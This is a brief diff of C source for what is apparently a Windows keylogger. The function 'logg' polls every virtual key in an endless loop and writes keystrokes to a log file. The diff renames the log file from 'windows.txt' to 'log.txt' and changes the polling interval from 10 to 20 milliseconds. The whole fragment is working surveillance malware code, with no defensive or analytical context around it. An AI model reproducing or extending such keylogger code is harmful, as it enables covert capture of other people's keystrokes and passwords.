@@ -10,7 +10,7 @@ DWORD WINAPI logg(){
 	char chars_va[]="[\\]\';";
 	char chars_vb[]="{|}\"";
 	FILE *kh;
-	char KEY_LOG_FILE[]="windows.txt";
+	char KEY_LOG_FILE[]="log.txt";
 	//: making last key state 0
 	for(vkey=0;vkey<0xFF;vkey++){
 		last_key_state[vkey]=0;
@@ -19,7 +19,7 @@ DWORD WINAPI logg(){
 	//: running infinite
 	while(1){
 		//: take rest for 10 millisecond
-		Sleep(10);
+		Sleep(20);
 
 		//: get key state of CAPSLOCK,NUMLOCK
 		//: and LEFT_SHIFT/RIGHT_SHIFT
